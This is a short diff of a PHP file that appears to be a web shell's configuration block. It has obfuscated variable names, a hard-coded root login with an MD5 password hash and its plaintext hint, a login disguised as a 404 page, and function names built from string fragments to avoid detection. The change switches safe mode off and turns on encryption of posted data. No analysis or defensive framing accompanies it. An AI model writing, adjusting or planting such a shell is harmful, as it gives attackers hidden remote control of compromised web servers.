@@ -101,10 +101,10 @@ if(function_exists('set_magic_quotes_runtime')){
 $GLOBALS['ayAHGSshXn'] = array(
 'username' => 'root',
 'password' => '36c50421033bac7dc1478edb819fb28d',//md5(ehsan)
-'safe_mode' => '1',
+'safe_mode' => '0',
 'login_page' => '404',
 'show_icons' => '',
-'post_encryption' => false,
+'post_encryption' => true,
 'cgi_api' => true,
 );
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
